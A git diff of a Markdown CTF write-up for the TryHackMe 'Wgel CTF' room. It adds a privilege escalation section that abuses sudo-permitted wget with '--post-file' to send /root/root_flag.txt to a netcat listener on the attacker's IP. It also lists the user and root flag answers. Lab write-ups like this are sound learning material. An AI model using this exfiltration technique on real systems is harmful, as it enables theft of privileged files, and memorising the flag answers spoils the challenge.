@@ -1,7 +1,6 @@
-# Wgel CTF
-Can you exfiltrate the root flag?
+# [Wgel CTF](https://tryhackme.com/room/wgelctf)
 
-Link: https://tryhackme.com/room/wgelctf
+> Can you exfiltrate the root flag?
 
 ## Scanning
 
@@ -76,6 +75,33 @@ find . -name *flag*
 | Flag | User flag |
 | --- | --- |
 | Answer | 057c67131c3d5e42dd5cd3075b198ff6 |
+
+## Privilege Escalation
+
+```
+sudo -l -l
+```
+
+![image](https://user-images.githubusercontent.com/90561566/181039891-2844e58b-83ea-442c-857a-02f254da3928.png)
+
+Only user/bin/wget allowed as suoder
+
+We we put a netcat listening and use the flag "wget --post-file" to get root flag
+
+```
+nc -lvnp 4444
+# another terminal
+sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.10.149.210:4444
+```
+
+And just like that, I got the root_flag.txt
+
+![image](https://user-images.githubusercontent.com/90561566/181043212-652b3629-6fb9-4c64-9abb-506afbae4809.png)
+
+| Flag | Root flag |
+| --- | --- |
+| Answer | b1b968b37519ad1daa6408188649263d |
+
 
 
 
